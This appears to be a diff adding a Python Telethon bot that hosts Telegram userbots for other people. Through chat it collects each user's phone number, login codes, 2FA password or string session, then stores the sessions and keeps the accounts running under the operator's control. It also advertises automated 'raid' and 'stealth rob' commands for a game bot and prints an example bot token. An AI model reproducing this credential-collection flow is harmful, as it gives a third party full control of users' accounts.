+            [Button.inline("🔑 2. Login By Session", data=b"method_session")],
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(method_text, buttons=method_buttons)
+        await event.answer()
+
+    # 3. Method 1: Login By Number
+    elif data == b"method_number":
+        if uid not in _LOGIN_FLOW:
+            _LOGIN_FLOW[uid] = {
+                "api_id": API_ID,
+                "api_hash": API_HASH,
+                "time": time.time(),
+            }
+
+        _LOGIN_FLOW[uid]["step"] = "AWAIT_PHONE"
+
+        phone_text = (
+            "📱 **1. Login By Number**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Kripya apna **Phone Number** country code ke sath yahan chat me bhejein:\n\n"
+            "👉 **Example:** `+919876543210`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        phone_buttons = [
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(phone_text, buttons=phone_buttons)
+        await event.answer()
+
+    # 4. Method 2: Login By Session
+    elif data == b"method_session":
+        if uid not in _LOGIN_FLOW:
+            _LOGIN_FLOW[uid] = {
+                "api_id": API_ID,
+                "api_hash": API_HASH,
+                "time": time.time(),
+            }
+
+        _LOGIN_FLOW[uid]["step"] = "AWAIT_SESSION"
+
+        session_text = (
+            "🔑 **2. Login By Session**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Kripya apna **Telethon String Session** yahan chat me paste karke bhejein:\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        session_buttons = [
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(session_text, buttons=session_buttons)
+        await event.answer()
+
+    # 4b. Resend OTP
+    elif data == b"resend_otp":
+        flow = _LOGIN_FLOW.get(uid)
+        if not flow or flow.get("step") != "AWAIT_OTP":
+            await event.answer("Session expire ho gaya, /start karein.", alert=True)
+            return
+        try:
+            sent = await _resend_otp(flow)
+            await event.respond(
+                f"🔄 **Code dobara bhej diya gaya!**\nAb yahan aayega: {_otp_type_text(sent)}",
+                buttons=_otp_buttons())
+            await event.answer("Code resend ho gaya")
+        except Exception as exc:
+            await event.answer(f"Resend fail: {exc}"[:190], alert=True)
+
+    # 5. Method 3: Close / Cancel
+    elif data in (b"cancel_login", b"close_menu"):
+        await _clean_login_flow(uid)
+        await event.respond("❌ **Process close kar diya gaya hai.** Dobara login karne ke liye `/start` karein.")
+        await event.answer()
+
+    # 6. Status check
+    elif data == b"status":
+        if uid in ACTIVE_CLIENTS:
+            cl = ACTIVE_CLIENTS[uid]
+            me = await cl.get_me()
+            ans = (
+                "📡 **Userbot Status Report**\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚡ **Status**: 🟢 Active & Running\n"
+                f"👤 **Account**: **{me.first_name}** (@{me.username or 'NoUsername'})\n"
+                f"🆔 **User ID**: `{me.id}`\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "Aap kisi bhi group/chat me `.menu` ya `.baka` chala sakte hain!"
+            )
+        else:
+            ans = (
+                "📡 **Userbot Status Report**\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚡ **Status**: 🔴 Offline (Not Logged In)\n"
+                "Apna userbot shuru karne ke liye **Login Userbot** button click karein."
+            )
+        await event.respond(ans)
+        await event.answer()
+
+    # 7. Help
+    elif data == b"help":
+        help_msg = (
+            "📖 **Champu Userbot Commands Guide**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Userbot commands (kisi bhi group/chat me run karein):\n\n"
+            "• `.menu` — Master Menu open karein\n"
+            "• `.baka` — Auto Kill + Rob raid on @im_bakabot\n"
+            "• `.bakarob` — Stealth rob active group members\n"
+            "• `.bakabal` — Check target balance\n"
+            "• `.stopbaka` — Instantly halt ongoing raid\n"
+            "• `.ping` — Check latency response\n"
+            "• `.admins` — Show admin list\n"
+            "• `.purge <count>` — Delete messages\n\n"
+            "Manager Bot Controls (is private chat me):\n"
+            "• `/start` — Welcome menu and buttons\n"
+            "• `/status` — View your userbot status\n"
+            "• `/logout` — Disconnect and logout your userbot\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await event.respond(help_msg)
+        await event.answer()
+
+    # 8. Logout
+    elif data == b"logout":
+        if uid in ACTIVE_CLIENTS:
+            await stop_user_client(uid)
+            await event.respond("🛑 **Aapka Champu Userbot band kar diya gaya hai aur session delete ho gaya hai.**")
+        else:
+            await event.respond("ℹ️ Aapka koi active userbot nahi mila.")
+        await event.answer()
+
+# ─── 3. Message Flow Handler (No command typing needed!) ───
+@manager_bot.on(events.NewMessage)
+async def mb_conversation_handler(event):
+    if not event.is_private:
+        return
+
+    text = (event.raw_text or "").strip()
+    if not text:
+        return
+
+    uid = event.sender_id
+
+    # Handle explicit commands
+    if text == "/start":
+        return  # handled by mb_start
+    if text in ("/login", "login"):
+        return await mb_start(event)
+    if text in ("/cancel", "/close", "close", "cancel"):
+        await _clean_login_flow(uid)
+        return await event.respond("❌ **Login process cancel kar diya gaya hai.** Dobara shuru karne ke liye `/start` karein.")
+    if text == "/status":
+        if uid in ACTIVE_CLIENTS:
+            cl = ACTIVE_CLIENTS[uid]
+            me = await cl.get_me()
+            return await event.respond(
+                f"📡 **Status**: 🟢 Active & Running\n👤 **Account**: **{me.first_name}** (`{me.id}`)"
+            )
+        else:
+            return await event.respond("📡 **Status**: 🔴 Offline (Not Logged In)")
+    if text == "/logout":
+        if uid in ACTIVE_CLIENTS:
+            await stop_user_client(uid)
+            return await event.respond("🛑 **Aapka Userbot logout kar diya gaya hai.**")
+        else:
+            return await event.respond("ℹ️ Aapka koi active userbot nahi mila.")
+    if text == "/users" and uid == OWNER_ID:
+        saved = load_saved_users()
+        lines = [f"👥 **Champu Userbot Network Stats**", f"━━━━━━━━━━━━━━━━━━━━━━", f"⚡ **Active Running Clients**: `{len(ACTIVE_CLIENTS)}`", f"📂 **Total Saved Accounts**: `{len(saved)}`\n"]
+        for uid_str, data in saved.items():
+            is_on = int(uid_str) in ACTIVE_CLIENTS
+            badge = "🟢" if is_on else "🔴"
+            name = data.get("first_name", "Unknown")
+            uname = f"@{data.get('username')}" if data.get("username") else "NoUser"
+            lines.append(f"{badge} `{uid_str}` — **{name}** ({uname})")
+        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+        return await event.respond("\n".join(lines))
+    if text.startswith("/broadcast") and uid == OWNER_ID:
+        parts = text.split(maxsplit=1)
+        if len(parts) > 1:
+            saved = load_saved_users()
+            sent = 0
+            for u in saved.keys():
+                try:
+                    await manager_bot.send_message(int(u), f"📢 **Announcement**\n━━━━━━━━━━━━━━━━━━━━━━\n{parts[1]}")
+                    sent += 1
+                except Exception:
+                    pass
+            return await event.respond(f"✅ Delivered to {sent}/{len(saved)} users.")
+        else:
+            return await event.respond("❌ Usage: `/broadcast <msg>`")
+
+    # If user is in an active login flow:
+    if uid not in _LOGIN_FLOW:
+        return
+
+    flow = _LOGIN_FLOW[uid]
+    step = flow.get("step")
+
+    # ─── Step A: User sent API ID ───
+    if step == "AWAIT_API_ID":
+        cleaned = text.strip()
+        if not cleaned.isdigit() or len(cleaned) < 4:
+            return await event.respond(
+                "❌ **Invalid API ID!**\nAPI ID sirf numbers me hona chahiye (e.g. `12345678`).\n\nKripya sahi API ID bhejein:"
+            )
+
+        flow["api_id"] = int(cleaned)
+        flow["step"] = "AWAIT_API_HASH"
+
+        buttons = [
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(
+            f"✅ **API ID Saved:** `{flow['api_id']}`\n\nAb apna **API HASH** yahan chat me bhejein (32 characters code):",
+            buttons=buttons
+        )
+
+    # ─── Step B: User sent API HASH ───
+    elif step == "AWAIT_API_HASH":
+        cleaned_hash = text.strip()
+        if len(cleaned_hash) < 16 or " " in cleaned_hash:
+            return await event.respond(
+                "❌ **Invalid API HASH!**\nAPI HASH ek 32-character code hota hai bina spaces ke.\n\nKripya sahi API HASH bhejein:"
+            )
+
+        flow["api_hash"] = cleaned_hash
+        flow["step"] = "CHOOSE_METHOD"
+
+        method_text = (
+            "🎯 **Select Login Method**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ **API Credentials Saved!**\n"
+            f"• API ID: `{flow['api_id']}`\n"
+            f"• API HASH: `{flow['api_hash'][:8]}...`\n\n"
+            "Aap kis tarike se login karna chahte hain? Niche chuniye:\n\n"
+            "1️⃣ **Login By Number** — Phone number par OTP aayega.\n"
+            "2️⃣ **Login By Session** — Telethon String Session paste karein.\n"
+            "3️⃣ **Close** — Process cancel karein.\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        method_buttons = [
+            [Button.inline("📱 1. Login By Number", data=b"method_number")],
+            [Button.inline("🔑 2. Login By Session", data=b"method_session")],
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(method_text, buttons=method_buttons)
+
+    # ─── Step C: User sent Phone Number ───
+    elif step == "AWAIT_PHONE":
+        cleaned_phone = text.strip().replace(" ", "").replace("-", "")
+        if not (cleaned_phone.startswith("+") and cleaned_phone[1:].isdigit() and len(cleaned_phone) >= 9):
+            return await event.respond(
+                "❌ **Invalid Phone Number!**\nKripya country code ke sath bhejein, jaise: `+919876543210`:"
+            )
+
+        status_msg = await event.respond("⏳ **Telegram server se connect karke OTP bhej rahe hain...**")
+
+        api_id = flow.get("api_id", API_ID)
+        api_hash = flow.get("api_hash", API_HASH)
+
+        try:
+            temp_cl = TelegramClient(StringSession(), api_id, api_hash)
+            await temp_cl.connect()
+
+            res = await temp_cl.send_code_request(cleaned_phone)
+
+            flow["temp_client"] = temp_cl
+            flow["phone"] = cleaned_phone
+            flow["phone_code_hash"] = res.phone_code_hash
+            flow["step"] = "AWAIT_OTP"
+
+            otp_prompt = (
+                "📩 **Telegram OTP Request Bhej Di Gayi!**\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"Phone: `{cleaned_phone}`\n\n"
+                f"Code yahan aayega: {_otp_type_text(res)}\n\n"
+                "Code aate hi yahan bhejein:\n"
+                "👉 **Example:** `12345` ya `1 2 3 4 5`\n\n"
+                "Code nahi aaya? **🔄 Resend Code** dabayein ya `resend` likh kar bhejein.\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            )
+            await status_msg.edit(otp_prompt, buttons=_otp_buttons())
+
+        except Exception as exc:
+            await status_msg.edit(f"❌ **OTP Request Failed:** `{str(exc)}`\n\nDobara phone number bhejein:")
+
+    # ─── Step D: User sent OTP Code ───
+    elif step == "AWAIT_OTP":
+        if text.strip().lower().lstrip("/") == "resend":
+            try:
+                sent = await _resend_otp(flow)
+                return await event.respond(
+                    f"🔄 **Code dobara bhej diya gaya!**\nAb yahan aayega: {_otp_type_text(sent)}",
+                    buttons=_otp_buttons())
+            except Exception as exc:
+                return await event.respond(f"❌ **Resend fail:** `{exc}`\nKuch der baad try karein ya `/start` se dobara shuru karein.")
+        clean_code = re.sub(r"[^\d]", "", text)
+        if not clean_code or len(clean_code) < 3:
+            return await event.respond("❌ **Invalid OTP!** Kripya sirf numbers bhejein (e.g. `12345` ya `1 2 3 4 5`):")
+
+        temp_cl = flow.get("temp_client")
+        phone = flow.get("phone")
+        p_hash = flow.get("phone_code_hash")
+
+        if not temp_cl or not phone or not p_hash:
+            await _clean_login_flow(uid)
+            return await event.respond("❌ Session expire ho chuka hai. Kripya `/start` se dobara shuru karein.")
+
+        status_msg = await event.respond("🔐 **OTP verify kar rahe hain...**")
+
+        try:
+            await temp_cl.sign_in(phone, clean_code, phone_code_hash=p_hash)
+
+            me = await temp_cl.get_me()
+            success = await start_user_client(temp_cl, uid)
+            _LOGIN_FLOW.pop(uid, None)
+
+            if success:
+                done_msg = (
+                    "🎉 **Done! Login Successful!**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 **Account**: **{me.first_name}** (@{me.username or 'NoUsername'})\n"
+                    f"🆔 **User ID**: `{me.id}`\n"
+                    "⚡ **Status**: Online & Ready 🟢\n\n"
+                    "Aapka Champu Userbot successfully active ho chuka hai!\n"
+                    "Ab aap kisi bhi group ya chat me jakar commands use kar sakte hain:\n"
+                    "• `.menu` — Master Menu open karein\n"
+                    "• `.baka` — Auto Kill & Rob raid run karein\n"
+                    "• `.ping` — Latency check karein\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 🔥"
+                )
+                await status_msg.edit(done_msg)
+            else:
+                await status_msg.edit("❌ **Userbot activate karne me dikkat aayi. Kripya dobara try karein.**")
+
+        except SessionPasswordNeededError:
+            flow["step"] = "AWAIT_PASSWORD"
+            twofa_msg = (
+                "🔒 **Two-Step Verification (2FA) Password Required!**\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "Aapke account par 2FA password laga hua hai.\n\n"
+                "Kripya apna **2FA Password** yahan chat me bhejein:\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            )
+            buttons = [
+                [Button.inline("❌ 3. Close", data=b"cancel_login")],
+            ]
+            await status_msg.edit(twofa_msg, buttons=buttons)
+
+        except PhoneCodeInvalidError:
+            await status_msg.edit("❌ **Galat OTP code!** Kripya sahi OTP dobara yahan chat me bhejein:")
+        except PhoneCodeExpiredError:
+            await _clean_login_flow(uid)
+            await status_msg.edit("⌛ **OTP expire ho chuka hai!** Kripya `/start` se dobara shuru karein.")
+        except Exception as exc:
+            await status_msg.edit(f"❌ **Login Error:** `{str(exc)}`\n\nKripya dobara OTP code bhejein:")
+
+    # ─── Step E: User sent 2FA Password ───
+    elif step == "AWAIT_PASSWORD":
+        password = text.strip()
+        temp_cl = flow.get("temp_client")
+
+        if not temp_cl:
+            await _clean_login_flow(uid)
+            return await event.respond("❌ Session expire ho gaya hai. Kripya `/start` se dobara shuru karein.")
+
+        status_msg = await event.respond("🔐 **2FA Password verify kar rahe hain...**")
+
+        try:
+            await temp_cl.sign_in(password=password)
+
+            me = await temp_cl.get_me()
+            success = await start_user_client(temp_cl, uid)
+            _LOGIN_FLOW.pop(uid, None)
+
+            if success:
+                done_msg = (
+                    "🎉 **Done! 2FA Verified & Login Successful!**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 **Account**: **{me.first_name}** (@{me.username or 'NoUsername'})\n"
+                    f"🆔 **User ID**: `{me.id}`\n"
+                    "⚡ **Status**: Online & Ready 🟢\n\n"
+                    "Aapka Champu Userbot successfully active ho chuka hai!\n"
+                    "Ab aap kisi bhi group ya chat me jakar commands use kar sakte hain:\n"
+                    "• `.menu` — Master Menu open karein\n"
+                    "• `.baka` — Auto Kill & Rob raid run karein\n"
+                    "• `.ping` — Latency check karein\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 🔥"
+                )
+                await status_msg.edit(done_msg)
+            else:
+                await status_msg.edit("❌ **Userbot activate karne me dikkat aayi. Kripya dobara try karein.**")
+
+        except PasswordHashInvalidError:
+            await status_msg.edit("❌ **Galat 2FA password!** Kripya sahi password yahan dobara bhejein:")
+        except Exception as exc:
+            await status_msg.edit(f"❌ **2FA Verification Error:** `{str(exc)}`\n\nDobara password bhejein:")
+
+    # ─── Step F: User sent String Session ───
+    elif step == "AWAIT_SESSION":
+        session_str = _to_telethon_session(text.strip())
+        status_msg = await event.respond("🔑 **String session verify kar rahe hain...**")
+
+        api_id = flow.get("api_id", API_ID)
+        api_hash = flow.get("api_hash", API_HASH)
+
+        try:
+            test_cl = TelegramClient(StringSession(session_str), api_id, api_hash)
+            await test_cl.connect()
+
+            if not await test_cl.is_user_authorized():
+                return await status_msg.edit("❌ **Invalid ya Expired String Session!**\nKripya sahi session yahan dobara bhejein:")
+
+            me = await test_cl.get_me()
+            success = await start_user_client(test_cl, uid)
+            _LOGIN_FLOW.pop(uid, None)
+
+            if success:
+                done_msg = (
+                    "🎉 **Done! String Session Accepted!**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 **Account**: **{me.first_name}** (@{me.username or 'NoUsername'})\n"
+                    f"🆔 **User ID**: `{me.id}`\n"
+                    "⚡ **Status**: Online & Ready 🟢\n\n"
+                    "Aapka Champu Userbot successfully active ho chuka hai!\n"
+                    "Ab aap kisi bhi chat me jakar `.menu` ya `.baka` use kar sakte hain!\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 🔥"
+                )
+                await status_msg.edit(done_msg)
+            else:
+                await status_msg.edit("❌ **Session start karne me error aaya.**")
+
+        except Exception as exc:
+            await status_msg.edit(f"❌ **Session Error:** `{str(exc)}`\n\nKripya valid session string bhejein:")
+
+
+# ────────────────────────────────────────────────
+#                   START
+# ────────────────────────────────────────────────
+def resolve_bot_token() -> str:
+    global BOT_TOKEN
+
+    # 1. Check if configured in outer scope or globals (HIGHEST PRIORITY)
+    tok = (globals().get("_OUTER_BOT_TOKEN") or globals().get("BOT_TOKEN") or "").strip()
+    if tok and tok != "PUT_BOT_TOKEN_HERE" and ":" in tok:
+        try:
+            t_file = os.path.join(BASE_DIR, "bot_token.txt")
+            with open(t_file, "w", encoding="utf-8") as f:
+                f.write(tok)
+        except Exception:
+            pass
+        return tok
+
+    # 2. Check if saved in bot_token.txt
+    t_file = os.path.join(BASE_DIR, "bot_token.txt")
+    if os.path.isfile(t_file):
+        try:
+            with open(t_file, "r", encoding="utf-8") as f:
+                saved = f.read().strip()
+                if saved and ":" in saved and saved.split(":", 1)[0].isdigit():
+                    BOT_TOKEN = saved
+                    return saved
+        except Exception:
+            pass
+
+    # 3. Interactive terminal prompt
+    print("\n" + "═" * 60)
+    print("🤖 CHAMPU MULTI-USERBOT MANAGER — SETUP")
+    print("═" * 60)
+    print("👉 Multi-Userbot chalane ke liye Telegram Bot Token chahiye.")
+    print("👉 @BotFather se apna bot banayein aur uska token yahan enter karein.")
+    print("   (Ya fir aap code ke upar BOT_TOKEN = '...' me bhi set kar sakte hain)")
+    print("═" * 60)
+
+    while True:
+        try:
+            entered = input("🔑 Bot Token enter karein (ya single-mode ke liye 'skip'): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print("\n🛑 Cancelled.")
+            return ""
+
+        if not entered:
+            continue
+
+        if entered.lower() in ("skip", "local", "exit"):
+            return ""
+
+        if ":" in entered:
+            parts = entered.split(":", 1)
+            if parts[0].isdigit():
+                BOT_TOKEN = entered
+                try:
+                    with open(t_file, "w", encoding="utf-8") as f:
+                        f.write(entered)
+                    print(f"💾 Bot Token 'bot_token.txt' me save ho gaya!")
+                except Exception:
+                    pass
+                return entered
+
+        print("❌ Invalid Bot Token format! Token me ':' aur shuru me numbers hone chahiye.")
+        print("   Example: 8548118793:AAGawPsvKojumucsVEnGjamYmgcAAuoCNiI\n")
+
+
+async def main():
+    global primary_client
+
+    try:
+        load_admins()
+        load_notes()
+        load_banner()
+
+        active_bot_token = resolve_bot_token()
+        is_bot_configured = bool(active_bot_token and ":" in active_bot_token)
+
+        if is_bot_configured:
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            print("🤖 STARTING CHAMPU MULTI-USERBOT MANAGER...")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+            try:
+                await manager_bot.start(bot_token=active_bot_token)
+                bot_me = await manager_bot.get_me()
+                uname = f"@{bot_me.username}" if bot_me.username else "Bot"
+                print("\n" + "═" * 60)
+                print(f"✅ TELEGRAM BOT MANAGER ONLINE: {uname} (ID: {bot_me.id})")
+                print("═" * 60)
+                print("🎉 Aapka Manager Bot Telegram par live ho chuka hai!")
+                print(f"👉 Ab koi bhi user Telegram me {uname} ko /start bhej kar")
+                print("   '🔐 Login Userbot' button se apna userbot host kar sakta hai!")
+                print("═" * 60)
+            except Exception as e:
+                print(f"❌ Failed to start Bot Manager: {e}")
+                return
+
+            # Restore and connect all saved user clients
+            saved_users = load_saved_users()
+            print(f"📂 Found {len(saved_users)} saved user account(s). Connecting...")
+
+            for uid_str, udata in saved_users.items():
+                try:
+                    s_str = udata.get("string_session")
+                    if s_str:
+                        u_client = TelegramClient(StringSession(s_str), API_ID, API_HASH, auto_reconnect=True)
+                        await u_client.connect()
+                        if await u_client.is_user_authorized():
+                            me = await u_client.get_me()
+                            u_client.user_id = me.id
+                            register_client_handlers(u_client)
+                            ACTIVE_CLIENTS[me.id] = u_client
+                            if primary_client is None:
+                                primary_client = u_client
+                            print(f"👤 Activated userbot for: {me.first_name} (ID: {me.id})")
+                        else:
+                            print(f"⚠️ Saved session for {uid_str} is expired or invalid.")
+                except Exception as exc:
+                    _en = type(exc).__name__
+                    if _en in ("AuthKeyDuplicatedError", "AuthKeyUnregisteredError",
+                               "SessionRevokedError", "SessionExpiredError", "UserDeactivatedError"):
+                        print(f"⚠️ Session for {uid_str} invalid ({_en}) — saved list se hata diya. "
+                              f"Dobara login karein (same session dusri jagah bhi chal raha hoga).")
+                        remove_user_session(int(uid_str))
+                    else:
+                        print(f"❌ Error restoring user {uid_str}: {exc}")
+
+            # Check if standalone session exists on disk
+            if os.path.isfile(f"{SESSION}.session"):
+                try:
+                    local_client = TelegramClient(SESSION, API_ID, API_HASH, auto_reconnect=True)
+                    await local_client.connect()
+                    if await local_client.is_user_authorized():
+                        me = await local_client.get_me()
+                        local_client.user_id = me.id
+                        register_client_handlers(local_client)
+                        ACTIVE_CLIENTS[me.id] = local_client
+                        if primary_client is None:
+                            primary_client = local_client
+                        print(f"👤 Local userbot session connected: {me.first_name} (ID: {me.id})")
+                except Exception as exc:
+                    print(f"[LOCAL SESSION NOTICE] {exc}")
+
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            print(f"🚀 CHAMPU MULTI-USERBOT IS FULLY RUNNING! ({len(ACTIVE_CLIENTS)} userbots active)")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+            # Run indefinitely
+            await asyncio.Event().wait()
+
+        else:
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            print("⚠️ BOT_TOKEN is not configured yet in usb.py!")
+            print("👉 To enable the Multi-User Login Bot, set BOT_TOKEN from @BotFather in usb.py")
+            print("🔄 Falling back to single-user local terminal mode...")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+            local_client = TelegramClient(SESSION, API_ID, API_HASH, auto_reconnect=True)
+            await local_client.start()
+            me = await local_client.get_me()
+            local_client.user_id = me.id
+            register_client_handlers(local_client)
+            ACTIVE_CLIENTS[me.id] = local_client
+            primary_client = local_client
+
+            uname = f"@{me.username}" if me.username else "NoUsername"
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            print("🤖 USERBOT STARTED LOCALLY")
+            print(f"👤 Logged in as → {me.first_name} ({uname})")
+            print(f"🆔 User ID → {me.id}")
+            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+            while True:
+                try:
+                    await local_client.run_until_disconnected()
+                    break
+                except (ConnectionError, OSError):
+                    print("⚠️ Connection Lost → Reconnecting...")
+                    await asyncio.sleep(3)
+
+    except KeyboardInterrupt:
+        print("\n🛑 Userbot stopped manually")
+
+    except Exception as e:
+        print(f"\n❌ Startup Error → {str(e)[:80]}")
+
+    finally:
+        for cl in list(ACTIVE_CLIENTS.values()):
+            try:
+                if cl.is_connected():
+                    await cl.disconnect()
+            except Exception:
+                pass
+        try:
+            if manager_bot.is_connected():
+                await manager_bot.disconnect()
+        except Exception:
+            pass
+
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except RuntimeError:
+        # ⭐ event loop reuse fix (pydroid / termux)
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(main())
